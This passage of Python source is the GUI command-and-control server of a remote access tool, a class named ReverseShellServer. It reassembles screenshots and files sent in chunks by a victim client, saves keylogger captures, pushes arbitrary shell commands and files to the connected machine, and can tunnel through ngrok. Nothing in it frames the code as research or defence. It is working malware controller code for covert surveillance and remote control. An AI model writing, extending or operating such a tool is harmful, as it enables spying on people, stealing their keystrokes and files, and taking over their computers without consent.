            elif msg_type == "screenshot_chunk":
                if hasattr(self, 'screenshot_data'):
                    self.screenshot_data["chunks"].append(message.get("chunk_data", ""))
                    received = len(self.screenshot_data["chunks"])
                    total = self.screenshot_data["total_chunks"]
                    if received % 10 == 0 or received == total:
                        progress = (received / total) * 100
                        self.log_message(f"[+] Screenshot progress: {progress:.1f}%", "info")
                
            elif msg_type == "screenshot_complete":
                if hasattr(self, 'screenshot_data'):
                    full_data = "".join(self.screenshot_data["chunks"])
                    
                    if len(full_data) == self.screenshot_data["total_size"]:
                        screenshot_msg = {
                            "type": "screenshot",
                            "filename": self.screenshot_data["filename"],
                            "data": full_data
                        }
                        self.handle_screenshot(screenshot_msg)
                    else:
                        self.log_message(f"[!] Screenshot data incomplete", "error")
                    
                    del self.screenshot_data
                    
            elif msg_type == "upload_start":
                self.upload_buffer = {
                    "filename": message.get("filename"),
                    "total_chunks": message.get("total_chunks"),
                    "chunks": [],
                    "compressed": message.get("compressed", False),
                    "original_size": message.get("original_size", 0)
                }
                self.log_message(f"[+] Receiving upload: {self.upload_buffer['filename']}", "info")
                
            elif msg_type == "upload_chunk":
                if hasattr(self, 'upload_buffer'):
                    self.upload_buffer["chunks"].append(message.get("chunk_data", ""))
                    received = len(self.upload_buffer["chunks"])
                    total = self.upload_buffer["total_chunks"]
                    if received % 10 == 0 or received == total:
                        progress = (received / total) * 100
                        self.log_message(f"[+] Upload progress: {progress:.1f}%", "info")
                
            elif msg_type == "upload_complete":
                if hasattr(self, 'upload_buffer'):
                    full_data = "".join(self.upload_buffer["chunks"])
                    
                    if len(full_data) > 0:
                        file_msg = {
                            "type": "file_data",
                            "filename": self.upload_buffer["filename"],
                            "data": full_data,
                            "compressed": self.upload_buffer["compressed"],
                            "original_size": self.upload_buffer["original_size"]
                        }
                        self.handle_upload_complete(file_msg)
                    else:
                        self.log_message(f"[!] Upload data empty", "error")
                    
                    del self.upload_buffer
                    
        except Exception as e:
            self.log_message(f"[!] Error processing message: {str(e)}", "error")
    
    def display_process_list(self, output):
        """Display process list with proper formatting"""
        clean_output = output.replace('\r\n', '\n').replace('\r', '\n')
        lines = clean_output.strip().split('\n')
        
        if not lines:
            return
        
        self.output_text.insert(tk.END, "\n" + "═" * 100 + "\n", "timestamp")
        self.output_text.insert(tk.END, "📊 PROCESS LIST\n", "command")
        self.output_text.insert(tk.END, "═" * 100 + "\n", "timestamp")
        
        for line in lines:
            if line.strip():
                if "Image Name" in line or "PID" in line or "Session" in line or "Mem Usage" in line:
                    self.output_text.insert(tk.END, line + "\n", "process_header")
                else:
                    self.output_text.insert(tk.END, line + "\n", "info")
        
        self.output_text.insert(tk.END, "═" * 100 + "\n\n", "timestamp")
        self.output_text.see(tk.END)
    
    def handle_system_info(self, message):
        """Handle system info message"""
        info = f"""
[SYSTEM INFO]
{'='*50}
Hostname: {message.get('hostname', 'N/A')}
Platform: {message.get('platform', 'N/A')}
User: {message.get('user', 'N/A')}
Current Directory: {message.get('current_dir', 'N/A')}
IP Address: {message.get('ip_address', 'N/A')}
Connection Mode: {message.get('connection_mode', 'N/A')}
"""
        self.log_message(info, "info")
    
    def handle_file_download(self, message):
        """Handle file download from client"""
        try:
            filename = message.get("filename", "downloaded_file")
            encoded_data = message.get("data", "")
            
            file_data = base64.b64decode(encoded_data)
            
            save_path = filedialog.asksaveasfilename(
                initialfile=filename,
                title="Save File",
                defaultextension=".*"
            )
            
            if save_path:
                with open(save_path, "wb") as f:
                    f.write(file_data)
                
                file_size = os.path.getsize(save_path)
                self.log_message(f"[+] File saved: {save_path} ({file_size/1024:.1f} KB)", "success")
                
        except Exception as e:
            self.log_message(f"[!] Error downloading file: {str(e)}", "error")
    
    def handle_upload_complete(self, message):
        """Handle completed upload from client"""
        try:
            filename = message.get("filename")
            encoded_data = message.get("data", "")
            compressed = message.get("compressed", False)
            
            file_data = base64.b64decode(encoded_data)
            
            if compressed:
                import zlib
                file_data = zlib.decompress(file_data)
            
            save_path = filedialog.asksaveasfilename(
                initialfile=filename,
                title="Save Uploaded File",
                defaultextension=os.path.splitext(filename)[1] if '.' in filename else ""
            )
            
            if save_path:
                with open(save_path, "wb") as f:
                    f.write(file_data)
                
                actual_size = os.path.getsize(save_path)
                self.log_message(f"[+] File saved: {save_path} ({actual_size/1024:.1f} KB)", "success")
                
        except Exception as e:
            self.log_message(f"[!] Error saving uploaded file: {str(e)}", "error")
    
    def handle_screenshot(self, message):
        """Handle incoming screenshot"""
        try:
            filename = message.get("filename", f"screenshot_{int(time.time())}.png")
            encoded_data = message.get("data", "")
            
            screenshot_data = base64.b64decode(encoded_data)
            
            # Check if compressed (zlib header)
            if len(screenshot_data) > 100 and screenshot_data[:2] == b'\x78\x9c':
                try:
                    import zlib
                    screenshot_data = zlib.decompress(screenshot_data)
                except:
                    pass
            
            screenshot_dir = "screenshots"
            if not os.path.exists(screenshot_dir):
                os.makedirs(screenshot_dir)
            
            counter = 1
            base_name, ext = os.path.splitext(filename)
            while os.path.exists(os.path.join(screenshot_dir, filename)):
                filename = f"{base_name}_{counter}{ext}"
                counter += 1
            
            save_path = os.path.join(screenshot_dir, filename)
            
            with open(save_path, "wb") as f:
                f.write(screenshot_data)
            
            file_size = os.path.getsize(save_path)
            self.log_message(f"[+] Screenshot saved: {save_path} ({file_size/1024:.1f} KB)", "success")
            
            self.root.after(100, lambda: self.ask_view_screenshot(save_path))
            
        except Exception as e:
            self.log_message(f"[!] Error handling screenshot: {str(e)}", "error")
    
    def ask_view_screenshot(self, filepath):
        """Ask user if they want to view the screenshot"""
        if os.path.exists(filepath):
            if messagebox.askyesno("Screenshot Saved", 
                                  f"Screenshot saved to:\n{filepath}\n\nOpen image?", 
                                  parent=self.root):
                try:
                    import platform
                    import subprocess
                    
                    if platform.system() == "Windows":
                        os.startfile(filepath)
                    elif platform.system() == "Darwin":
                        subprocess.call(["open", filepath])
                    else:
                        subprocess.call(["xdg-open", filepath])
                except Exception as e:
                    self.log_message(f"[!] Failed to open image: {str(e)}", "error")
    
    def handle_keylog_data(self, message):
        """Handle incoming keylogger data"""
        try:
            filename = message.get("filename", f"keylog_{int(time.time())}.txt")
            encoded_data = message.get("data", "")
            
            keylog_data = base64.b64decode(encoded_data).decode('utf-8', errors='ignore')
            
            keylog_dir = "keylogs"
            if not os.path.exists(keylog_dir):
                os.makedirs(keylog_dir)
            
            save_path = os.path.join(keylog_dir, filename)
            with open(save_path, "w", encoding='utf-8') as f:
                f.write(keylog_data)
            
            self.log_message(f"[+] Keylog saved: {save_path}", "success")
            
        except Exception as e:
            self.log_message(f"[!] Error handling keylog: {str(e)}", "error")
    
    def send_command(self, event=None):
        cmd = self.cmd_entry.get()
        if cmd and self.client_socket:
            self.cmd_entry.delete(0, tk.END)
            self.log_message(f"[>>] {cmd}", "command")
            
            try:
                command_data = json.dumps({
                    "type": "command",
                    "command": cmd,
                    "current_dir": self.current_dir
                })
                self.client_socket.send(command_data.encode())
            except Exception as e:
                self.log_message(f"[!] Failed to send command: {str(e)}", "error")
    
    def send_command_event(self, cmd):
        if self.client_socket:
            self.log_message(f"[>>] {cmd}", "command")
            try:
                command_data = json.dumps({
                    "type": "command",
                    "command": cmd,
                    "current_dir": self.current_dir
                })
                self.client_socket.send(command_data.encode())
            except Exception as e:
                self.log_message(f"[!] Failed to send command: {str(e)}", "error")
    
    def quick_command(self, cmd):
        self.send_command_event(cmd)
    
    def upload_file(self):
        """Upload file to client with chunking for large files"""
        if not self.client_socket:
            messagebox.showwarning("Warning", "No client connected")
            return
        
        filepath = filedialog.askopenfilename(
            title="Select file to upload (max 5MB)",
            filetypes=[("All files", "*.*")]
        )
        
        if not filepath:
            return
        
        try:
            file_size = os.path.getsize(filepath)
            if file_size > 5 * 1024 * 1024:
                messagebox.showwarning("File Too Large", 
                                      "File size exceeds 5MB limit")
                return
            
            with open(filepath, "rb") as f:
                file_data = f.read()
            
            filename = os.path.basename(filepath)
            
            # Compress data
            import zlib
            compressed_data = zlib.compress(file_data)
            encoded_data = base64.b64encode(compressed_data).decode('utf-8')
            
            # Calculate chunks
            chunk_size = 5000
            total_chunks = (len(encoded_data) + chunk_size - 1) // chunk_size
            
            # Send start signal
            start_data = {
                "type": "upload_start",
                "filename": filename,
                "total_chunks": total_chunks,
                "original_size": file_size,
                "compressed": True
            }
            
            try:
                self.client_socket.send(json.dumps(start_data).encode())
            except Exception as e:
                self.log_message(f"[!] Failed to send start signal: {str(e)}", "error")
                return
            
            self.log_message(f"[+] Starting upload: {filename} ({file_size/1024:.1f} KB, {total_chunks} chunks)", "info")
            
            # Send chunks
            for i in range(total_chunks):
                start_idx = i * chunk_size
                end_idx = min((i + 1) * chunk_size, len(encoded_data))
                chunk = encoded_data[start_idx:end_idx]
                
                chunk_data = {
                    "type": "upload_chunk",
                    "chunk_index": i,
                    "chunk_data": chunk,
                    "filename": filename
                }
                
                try:
                    self.client_socket.send(json.dumps(chunk_data).encode())
                    time.sleep(0.001)
                except Exception as e:
                    self.log_message(f"[!] Failed to send chunk {i}: {str(e)}", "error")
                    return
                
                if (i + 1) % 10 == 0 or (i + 1) == total_chunks:
                    progress = ((i + 1) / total_chunks) * 100
                    self.log_message(f"[+] Upload progress: {progress:.1f}%", "info")
            
            # Send completion
            complete_data = {
                "type": "upload_complete",
                "filename": filename
            }
            
            self.client_socket.send(json.dumps(complete_data).encode())
            self.log_message(f"[+] Upload completed: {filename}", "success")
            
        except Exception as e:
            self.log_message(f"[!] Upload failed: {str(e)}", "error")
    
    def download_file(self):
        if not self.client_socket:
            messagebox.showwarning("Warning", "No client connected")
            return
        
        filename = simpledialog.askstring("Download", "Enter filename to download:")
        if filename:
            download_data = json.dumps({
                "type": "download",
                "filename": filename
            })
            self.client_socket.send(download_data.encode())
    
    def connection_closed(self):
        self.status_label.config(text="❌ Status: Connection Lost", fg=self.error_color)
        self.send_btn.config(state=tk.DISABLED)
        self.log_message("[!] Connection closed", "error")
        
        # Clean up buffers
        if hasattr(self, 'screenshot_data'):
            del self.screenshot_data
        if hasattr(self, 'upload_buffer'):
            del self.upload_buffer
            
        self.client_socket = None
        self.client_address = None
    
    def stop_server(self):
        self.is_running = False
        
        if self.mode_var.get() == "ngrok":
            self.stop_ngrok_tunnel()
        
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="⏹️ Status: Server Stopped", fg=self.error_color)
        self.log_message("[+] Server stopped", "success")
    
    def log_message(self, message, tag="info"):
        """Log message with color coding"""
        timestamp = time.strftime("%H:%M:%S")
        self.output_text.insert(tk.END, f"[{timestamp}] {message}\n", tag)
        self.output_text.see(tk.END)
    
    def on_closing(self):
        self.stop_server()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = ReverseShellServer(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()